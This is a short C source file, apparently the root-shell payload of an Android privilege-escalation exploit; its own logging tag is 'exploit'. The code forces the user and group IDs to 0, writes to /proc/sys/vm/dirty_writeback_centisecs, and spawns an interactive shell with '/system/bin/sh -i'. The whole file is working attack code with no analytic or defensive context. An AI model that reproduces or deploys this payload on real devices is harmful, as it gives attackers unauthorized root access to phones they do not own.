#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <dlfcn.h>
#include <fcntl.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

int main(int argc, const char **argv) {
	LOGV("uid %s %d", argv[0], getuid());

	if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
		LOGV("setresgid/setresuid failed");
	}

	LOGV("uid %d", getuid());
	dlerror();

	int fd = open("/proc/sys/vm/dirty_writeback_centisecs", O_WRONLY);
	if (fd == -1) LOGV("Failed to open /proc/sys/vm/dirty_writeback_centisecs\n");
	if (write(fd, "0", 1) != 1) LOGV("Failed to write 0 to /proc/sys/vm/dirty_writeback_centisecs\n");

	system("/system/bin/sh -i");
}
